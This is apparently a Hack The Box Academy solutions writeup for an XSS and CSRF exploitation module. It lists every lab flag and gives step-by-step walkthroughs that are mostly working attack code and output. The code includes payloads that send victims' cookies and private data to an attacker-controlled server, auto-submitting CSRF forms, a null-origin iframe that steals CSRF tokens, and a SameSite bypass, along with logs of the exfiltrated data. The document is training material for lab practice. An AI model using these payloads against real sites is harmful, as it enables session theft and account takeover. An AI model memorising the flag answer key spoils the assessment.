# Solutions

## Advanced XSS and CSRF Exploitation Module

### Section Questions Writeup

**Tier: 3**

**Difficulty: Medium**

**Type: Offensive**

**Created By: vautia**

**Co-Authors: -**

### Section Questions and their Answers

| Section                                          | Question Number | Answer                                |
| ------------------------------------------------ | --------------- | ------------------------------------- |
| Lab Warmup                                       | Question 1      | HTB{ff86ab3e75c897ede8ed99faa8c85f2d} |
| Lab Warmup                                       | Question 2      | HTB{787377f6956f116d605a063bd39efd92} |
| CORS Misconfigurations                           | Question 1      | HTB{d5be18c11251032c6542446ec8e62360} |
| Bypassing CSRF Tokens via CORS Misconfigurations | Question 1      | HTB{ace270bd2b0afa1d20ac991b9791d138} |
| Misc CSRF Exploitation                           | Question 1      | HTB{4c9139f64d4ed5abf847d7da2c24dd2c} |
| Introduction to XSS Exploitation                 | Question 1      | HTB{5665fd1b899a2760ca6d0296b7686991} |
| Launching Attacks from the Victim's Session      | Question 1      | HTB{ef6822275912cb2e1f2e3ab8d3b5e4fe} |
| Enumerating internal APIs                        | Question 1      | HTB{fb1314f533bf1c257997e25d81b6049c} |
| Exploiting internal Web Applications I           | Question 1      | HTB{5a60fa501e1866626e96115b598d4541} |
| Exploiting internal Web Applications II          | Question 1      | HTB{0ec9ae3aea3c59121ff2f1b4e99d0fca} |
| XSS Filter Bypasses                              | Question 1      | HTB{1e9069021a3b73f41dc230f3e3ef5685} |
| Skills Assessment                                | Question 1      | HTB{e753a7db6e4e23015d89ef9fa1ecf0f6} |

### Acronyms Used in Writeups

| Acronym | Meaning                                                 |
| ------- | ------------------------------------------------------- |
| STMIP   | Spawned Target Machine IP Address                       |
| STMPO   | Spawned Target Machine Port                             |
| PMVPN   | Personal Machine with a Connection to the Academy's VPN |
| PWNIP   | Pwnbox IP Address (or PMVPN IP Address)                 |
| PWNPO   | Pwnbox Port (or PMVPN Port)                             |

## Lab Warmup

### Question 1

#### "Familiarize yourself with the lab environment. Use the components to exploit the XSS vulnerability to steal the victim's cookie."

Students need to first add the necessary vhosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb xss.labintro.htb csrf.labintro.htb" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.233.62 exploitserver.htb xss.labintro.htb csrf.labintro.htb" >> /etc/hosts'
```

Next, students need to use their browser to navigate to `https://xss.labintro.htb`, logging in with the credentials `htb-stdnt:Academy_student!`:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_1.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_1.png)

Upon logging in, students will find that the home page allows for users to leave a comment to the guestbook. Comments that are stored can then be viewed, creating a stored XSS vulnerability. To prepare for the attack, students need to go to their `exploit server` (located at `https://exploitserver.htb`) where they will prepare an XSS payload utilizing the [window.location](https://www.w3schools.com/js/js_window_location.asp) object to steal the victim's session cookie. Students need to replace the IP-address with their own:

Code: js

```js
window.location = "https://10.10.14.144:4443/cookiestealer?c=" + document.cookie;
```

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_2.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_2.png)

Students need to press `Save`, allowing for the payload to be viewed at `https://exploitserver.htb/exploit` . Therefore, students need to return to `https://xss.labintro.htb` and submit a payload that loads the script from the exploit server:

Code: html

```html
<script src="https://exploitserver.htb/exploit"></script>
```

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_3.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_3.png)

Lastly, students need to create a Python script `server.py` that runs an HTTPS server:

Code: python

```python
from http import server
import ssl

httpd = server.HTTPServer(('0.0.0.0', 4443), server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
```

Before running the server, students need to generate a self-signed server certificate:

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

Students need to wait a few moments for the victim to trigger the XSS. Finally, students need to check the exfiltration server running on their system to find the cookie along with the flag:

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ python3 server.py

10.129.233.62 - - [05/Jan/2025 10:01:51] code 404, message File not found
10.129.233.62 - - [05/Jan/2025 10:01:51] "GET /cookiestealer?c=PHPSESSID=f1gpul0aqqfkdpt8e5q6tpb9ce;%20flag=HTB{ff86ab3e75c897ede8ed99faa8c85f2d} HTTP/1.1" 404 -
```

Answer: `HTB{ff86ab3e75c897ede8ed99faa8c85f2d}`

## Lab Warmup

### Question 2

#### "Use the lab components to exploit the CSRF vulnerability to get your user promoted to administrator."

Students need to begin by browsing to `https://csrf.labintro.htb`, then click `Sign In` in the top right hand corner. Then, students need to login with the credentials `htb-stdnt:Academy_student!`

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_5.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_5.png)

Upon logging in, students will see that the currently are assigned `user` permissions. Therefore, students need to go to their `exploit server` and save the following payload (which creates an HTML form that causes the victim to make a GET request to `https://csrf.labintro.htb/profile.php?promote=htb-stdnt`:

Code: html

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form method="GET" action="https://csrf.labintro.htb/profile.php">
      <input type="hidden" name="promote" value="htb-stdnt" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_6.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_6.png)

Subsequently, students need to select `Deliver to Victim` for the `csrf.labintro.htb` vHost , causing the victim to trigger the payload. After a few moments, students need to go back to `https://csrf.labintro.htb` and refresh the page. Students will find that they now have administrator privileges, with the flag being revealed:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_7.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_7.png)

Answer: `HTB{787377f6956f116d605a063bd39efd92}`

## CORS Misconfigurations

### Question 1

#### "Identify and exploit a CORS misconfiguration to obtain the victim's private message."

Students need to first add the necessary vhosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb cors-misconfigs.htb" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.233.62 exploitserver.htb cors-misconfigs.htb" >> /etc/hosts'
```

Next, students need to browse to `https://cors-misconfigs.htb` and login with the credentials `htb-student:HTB_@cademy_stdnt!`. Then, students need to right-click and `View Page Source`:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_8.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_8.png)

Within the paragraph element (`<p>`), students will find the attribute `id="private-message"` which contains the private message. Therefore, students need to create a payload to extract the value of this attribute and send it to the exfiltration server:

Code: html

```html
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://cors-misconfigs.htb/profile.php', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
	  var doc = new DOMParser().parseFromString(xhr.response, 'text/html');
	  var msg = encodeURIComponent(doc.getElementById('private-message').innerHTML);
      location = 'https://10.10.14.144:4443/log?data=' + btoa(msg);
    };
    xhr.send();
</script>
```

Students need to save the payload on the exploitation server, then select `Deliver to Victim` for the `cors-misconfigs.htb` vHost:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_9.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_9.png)

After a few moments, students need to check their exfiltration server to discover to the base64 encoded response that was successfully exfiltrated:

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ python3 server.py

10.129.233.62 - - [05/Jan/2025 10:11:22] code 404, message File not found
10.129.233.62 - - [05/Jan/2025 10:11:22] "GET /log?data=SGVyZSUyMGlzJTIweW91ciUyMHByaXZhdGUlMjBtZXNzYWdlJTNBJTNDYnIlM0VIVEIlN0JkNWJlMThjMTEyNTEwMzJjNjU0MjQ0NmVjOGU2MjM2MCU3RA== HTTP/1.1" 404 -
```

Finally, students need to decode the data to discover the victim's private message, along with the flag:

Code: shell

```shell
echo SGVyZSUyMGlzJTIweW91ciUyMHByaXZhdGUlMjBtZXNzYWdlJTNBJTNDYnIlM0VIVEIlN0JkNWJlMThjMTEyNTEwMzJjNjU0MjQ0NmVjOGU2MjM2MCU3RA== | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ echo SGVyZSUyMGlzJTIweW91ciUyMHByaXZhdGUlMjBtZXNzYWdlJTNBJTNDYnIlM0VIVEIlN0JkNWJlMThjMTEyNTEwMzJjNjU0MjQ0NmVjOGU2MjM2MCU3RA== | base64 -d

Here%20is%20your%20private%20message%3A%3Cbr%3EHTB%7Bd5be18c11251032c6542446ec8e62360%7D
```

The flag resulting flag is URL encoded; therefore, students need to use the Burpsuite `Decoder` to perform the URL decoding:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_11.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_11.png)

Students will identify the flag `HTB{d5be18c11251032c6542446ec8e62360}`.

Answer: `HTB{d5be18c11251032c6542446ec8e62360}`

## Bypassing CSRF Tokens via CORS Misconfigurations

### Question 1

#### "Identify a CORS misconfiguration and exploit it to conduct a CSRF attack and obtain administrator privileges."

Students need to first add the necessary vhosts to their `/etc/hosts` file.

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb bypassing-csrftokens.htb" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.233.62 exploitserver.htb bypassing-csrftokens.htb" >> /etc/hosts'
```

Next, students need to open Burpsuite, then navigate to `Proxy` -> `Options` -> `Import/Export CA Certificate`. Then, students need to choose `Export Certificate in DER format`, saving the file as `burp.der`:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_12.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_12.png)

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_13.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_13.png)

With the certificate saved, students need to open Firefox and navigate to `Settings` -> `Certificates` -> `View Certificates`:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_14.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_14.png)

Students need to `Import` the `burp.der` certificate:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_15.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_15.png)

With the certificate successfully imported, Burpsuite will now be able to intercept `HTTPS` traffic.

Now, students need to browse to `https://bypassing-csrftokens.htb`, logging in with the credentials `htb-stdnt:Academy_student!` while intercepting the request with Burpsuite. Students need to forward the request and inspect the headers of the response:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_16.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_16.png)

Students will find find the server is configured to trust a `null` origin, via the [Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) header. Therefore, students will need to supply a `null` origin for any cross-origin request. After forwarding the request to `/login.php`, students need to forward the next request to `/profile.php` and analyze the response, identifying the attribute `id="csrf_token"`:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_17.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_17.png)

After forwarding the request to `/profile.php`, students need to go back to Firefox and view the page. Subsequently, students need to click `promote` and intercept the request:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_18.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_18.png)

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_19.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_19.png)

Students will identify the POST parameters required to perform the request. Therefore, students need to prepare an XSS payload that extracts the value of the administrator's CSRF token, while supplying it as data in a POST request to promote the htb-stdnt user. Additionally, the payload must be placed within a sandboxed iframe, in order to supply a `null` origin:

Code: html

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
	// GET CSRF token
	var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://bypassing-csrftokens.htb/profile.php', false);
    xhr.withCredentials = true;
    xhr.send();
    var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
	var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);

	// do CSRF
    var csrf_req = new XMLHttpRequest();
    var params = `promote=htb-stdnt&csrf_token=${csrftoken}`;
    csrf_req.open('POST', 'https://bypassing-csrftokens.htb/profile.php', false);
	csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    csrf_req.withCredentials = true;
    csrf_req.send(params);
</script>"></iframe>
```

Students need to save the payload on the exploit server, then select `Deliver to Victim` for the `bypassing-csrftokens.htb` vHost:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_20.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_20.png)

Finally, students need to return to `https://bypassing-csrftokens.htb/profile.php` and refresh the page:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_21.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_21.png)

Answer: `HTB{ace270bd2b0afa1d20ac991b9791d138}`

## Misc CSRF Exploitation

### Question 1

#### "Identify a way to bypass the SameSite cookie restriction to conduct a successful CSRF attack to obtain administrator privileges."

Students need to first add the necessary vhosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb misc-csrf.htb" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.233.62 exploitserver.htb misc-csrf.htb" >> /etc/hosts'
```

Next, students need to use open Firefox and navigate to `https://misc-csrf.htb`, then sign in with the credentials `htb-stdnt:Academy_student!` while intercepting the request with Burpsuite:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_22.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_22.png)

Students need to forward the request and inspect the headers seen in the response:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_23.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_23.png)

Students will find the server is utilizing `SameSite=Strict` cookies. Therefore, students will need to identify and exploit a `client-side redirect` to obtain Administrator privileges.

After forwarding the request to `/login.php`, students will find the next request is directed towards `/admin.php?user=htb-stdnt`. Students need to forward this request as well, then inspect the server response:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_24.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_24.png)

Students will identify that the resulting redirect is implemented using an HTML `meta` tag, which is a client-side redirect. Furthermore, students can inject additional GET parameters to the URL via the `user` GET parameter, as the web application will copy that parameter in the redirection URL:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_25.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_25.png)

Students need to follow the redirects until they arrive at `/profile.php?user=htb-stdnt`, then go back to Firefox to view the page. Then, students need to click `promote` and intercept the request:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_18.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_18.png)

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_26.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_26.png)

Having identified the user profile as being vulnerable to CSRF, students need to craft a payload to promote their user via the `/profile.php?promote=htb-stdnt` endpoint, while utilizing the previously discovered client-side redirect:

Code: html

```html
<script>
document.location = "http://misc-csrf.htb/admin.php?user=htb-stdnt%26promote=htb-stdnt";
</script>
```

Students need to save the payload to the exploit server, then select `Deliver to Victim` for the `misc-csrf.htb` vHost:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_27.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_27.png)

Students need to wait a few moments for the victim to trigger the payload. Finally, students need to return to `https://misc-csrf.htb/profile.php?user=htb-stdnt` and refresh the page:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_28.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_28.png)

Answer: `HTB{4c9139f64d4ed5abf847d7da2c24dd2c}`

## Introduction to XSS Exploitation

### Question 1

#### "Exploit the XSS vulnerability to exfiltrate data the victim can access and find the flag."

Students need to first add the necessary vhosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb xssintro.htb" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.233.62 exploitserver.htb xssintro.htb" >> /etc/hosts'
```

Next, students need to sign in to `https://xssintro.htb` using the credentials `htb-stdnt:Academy_student!`:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_1.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_1.png)

Upon logging in, students will find that the page allows for users to leave a comment to the guestbook, which is vulnerable to XSS. Therefore, students need to go to the exploit server (located at `https://exploitserver.htb`) where they will prepare a javascript payload to exfiltrate the contents of `/home.php` (with the goal of identifying other endpoints available to the administrator user). Students need to utilize an [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) object to perform the HTTP requests:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://xssintro.htb/home.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.116:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_29.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_29.png)

Students need to save the payload to the exploit server. Then, students need to return to `https://xssintro.htb/home.php` and submit an XSS payload that references the script that was saved to `https://exploitserver.htb/exploit`:

Code: html

```html
<script src="https://exploitserver.htb/exploit"></script>
```

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_3.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_3.png)

After a few moments, students need to check their exfiltration server to find the base64 encoded data:

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ python3 server.py

10.129.233.62 - - [05/Jan/2025 10:22:42] code 404, message File not found
10.129.233.62 - - [05/Jan/2025 10:22:42] "GET /exfil?r=CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJ1aSBjb250YWluZXIgbWVudSI+CgkJCTxkaXYgY2xhc3M9ImhlYWRlciBpdGVtIj4KCQkJCU15IEd1ZXN0Qm9vawoJCQk8L2Rpdj4KCQkJPGEgY2xhc3M9Iml0ZW0iIGhyZWY9ImhvbWUucGhwIj4KCQkJCUhvbWUKCQkJPC9hPgoJCQk8YSBjbGFzcz0iYWN0aXZlIGl0ZW0iIGhyZWY9InZpZXcucGhwIj4KCQkgICAgCVZpZXcgYWxsIEVudHJpZXMKCQkgIAk8L2E+CgkJCQkJCQk8YSBjbGFzcz0iYWN0aXZlIGl0ZW0iIGhyZWY9ImFkbWluLnBocCI+CgkJICAgIAkJQWRtaW5pc3RyYXRvciBEYXNoYm9hcmQKCQkgIAkJPC9hPgogICAgICAgICAgICAJCQk8YSBjbGFzcz0iYWN0aXZlIGl0ZW0iIGhyZWY9ImxvZ291dC5waHAiPgoJCSAgICAJTG9nb3V0CgkJICAJPC9hPgoJCTwvZGl2PgoJCTxkaXYgY2xhc3M9InVpIHJhaXNlZCB2ZXJ5IHBhZGRlZCBjb250YWluZXIgc2VnbWVudCI+CgkJCTxkaXYgY2xhc3M9InVpIGNlbnRlcmVkIGdyaWQiPgoJCQkgICAgPGRpdiBjbGFzcz0iZWlnaHQgd2lkZSBjZW50ZXIgYWxpZ25lZCBjb2x1bW4iPgoJCQkgICAgCTxpbWcgc3JjPSJhc3NldHMvYWNlLnBuZyIgd2lkdGg9IjUwcHg7aGVpZ2h0OmF1dG87Ij4KCQkJICAgIAk8aDEgc3R5bGU9Im1hcmdpbi1ib3R0b206IDAiPldyaXRlIGFuIEVudHJ5IHRvIHRoZSBHdWVzdGJvb2s8L2gxPgogICAgICAgICAgICAgICAgICAgIAoJCQkgICAgCTxmb3JtIGNsYXNzPSJ1aSBmb3JtIGxlZnQgYWxpZ25lZCBzaXggY29sdW1uIHNlZ21lbnQiIGFjdGlvbj0iL2hvbWUucGhwIiBtZXRob2Q9InBvc3QiIG5hbWU9ImZvcm0iIGlkPSJmb3JtIj4KICAgICAgICAgICAgICAgICAgICAJCQkgICAgCSAgPGRpdiBjbGFzcz0iZmllbGQiPgoJCQkgICAgCSAgICAgIDxsYWJlbD5Db21tZW50PC9sYWJlbD4KCQkJICAgIAkgICAgICA8dGV4dGFyZWEgbmFtZT0iY29tbWVudCIgaWQ9ImNvbW1lbnQiPjwvdGV4dGFyZWE+CgkJCSAgICAJICA8L2Rpdj4KCQkJICAgIAkgIDxidXR0b24gY2xhc3M9InVpIHN1Ym1pdCBidXR0b24iIHR5cGU9InN1Ym1pdCI+U3VibWl0PC9idXR0b24+CgkJCSAgICAJPC9mb3JtPgoJCQkgICAgPC9kaXY+CgkJCTwvZGl2PgoJCTwvZGl2PgoJPC9ib2R5PgoJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJCSQoJy51aS5jaGVja2JveCcpCgkJICAuY2hlY2tib3goKQoJCTsKCQkkKCcubWVzc2FnZSAuY2xvc2UnKQoJCSAgLm9uKCdjbGljaycsIGZ1bmN0aW9uKCkgewoJCSAgICAkKHRoaXMpCgkJICAgICAgLmNsb3Nlc3QoJy5tZXNzYWdlJykKCQkgICAgICAudHJhbnNpdGlvbignZmFkZScpCgkJICAgIDsKCQkgIH0pCgkJOwoJCSQoJy51aS5mb3JtJykKCQkgIC5mb3JtKHsKCQkgICAgZmllbGRzOiB7CgkJICAgICAgZnVsbG5hbWUgOiAnZW1wdHknLAoJCSAgICAgIGVtYWlsICAgOiAnZW1haWwnLAoJCSAgICAgIGNvbW1lbnQgIDogJ2VtcHR5JywKCQkgICAgICB0ZXJtcyAgICA6ICdjaGVja2VkJwoJCSAgICB9CgkJICB9KQoJCTsKCTwvc2NyaXB0Pgo8L2h0bWw+ HTTP/1.1" 404 -
```

Students need to decode the exfiltrated data:

Code: shell

```shell
echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJ1aSBjb250YWluZXIgbWVudSI+CgkJCTxkaXYgY2xhc3M9ImhlYWRlciBpdGVtIj4KCQkJCU15IEd1ZXN0Qm9vawoJCQk8L2Rpdj4KCQkJPGEgY2xhc3M9Iml0ZW0iIGhyZWY9ImhvbWUucGhwIj4KCQkJCUhvbWUKCQkJPC9hPgoJCQk8YSBjbGFzcz0iYWN0aXZlIGl0ZW0iIGhyZWY9InZpZXcucGhwIj4KCQkgICAgCVZpZXcgYWxsIEVudHJpZXMKCQkgIAk8L2E+CgkJCQkJCQk8YSBjbGFzcz0iYWN0aXZlIGl0ZW0iIGhyZWY9ImFkbWluLnBocCI+CgkJICAgIAkJQWRtaW5pc3RyYXRvciBEYXNoYm9hcmQKCQkgIAkJPC9hPgogICAgICAgICAgICAJCQk8YSBjbGFzcz0iYWN0aXZlIGl0ZW0iIGhyZWY9ImxvZ291dC5waHAiPgoJCSAgICAJTG9nb3V0CgkJICAJPC9hPgoJCTwvZGl2PgoJCTxkaXYgY2xhc3M9InVpIHJhaXNlZCB2ZXJ5IHBhZGRlZCBjb250YWluZXIgc2VnbWVudCI+CgkJCTxkaXYgY2xhc3M9InVpIGNlbnRlcmVkIGdyaWQiPgoJCQkgICAgPGRpdiBjbGFzcz0iZWlnaHQgd2lkZSBjZW50ZXIgYWxpZ25lZCBjb2x1bW4iPgoJCQkgICAgCTxpbWcgc3JjPSJhc3NldHMvYWNlLnBuZyIgd2lkdGg9IjUwcHg7aGVpZ2h0OmF1dG87Ij4KCQkJICAgIAk8aDEgc3R5bGU9Im1hcmdpbi1ib3R0b206IDAiPldyaXRlIGFuIEVudHJ5IHRvIHRoZSBHdWVzdGJvb2s8L2gxPgogICAgICAgICAgICAgICAgICAgIAoJCQkgICAgCTxmb3JtIGNsYXNzPSJ1aSBmb3JtIGxlZnQgYWxpZ25lZCBzaXggY29sdW1uIHNlZ21lbnQiIGFjdGlvbj0iL2hvbWUucGhwIiBtZXRob2Q9InBvc3QiIG5hbWU9ImZvcm0iIGlkPSJmb3JtIj4KICAgICAgICAgICAgICAgICAgICAJCQkgICAgCSAgPGRpdiBjbGFzcz0iZmllbGQiPgoJCQkgICAgCSAgICAgIDxsYWJlbD5Db21tZW50PC9sYWJlbD4KCQkJICAgIAkgICAgICA8dGV4dGFyZWEgbmFtZT0iY29tbWVudCIgaWQ9ImNvbW1lbnQiPjwvdGV4dGFyZWE+CgkJCSAgICAJICA8L2Rpdj4KCQkJICAgIAkgIDxidXR0b24gY2xhc3M9InVpIHN1Ym1pdCBidXR0b24iIHR5cGU9InN1Ym1pdCI+U3VibWl0PC9idXR0b24+CgkJCSAgICAJPC9mb3JtPgoJCQkgICAgPC9kaXY+CgkJCTwvZGl2PgoJCTwvZGl2PgoJPC9ib2R5Pgo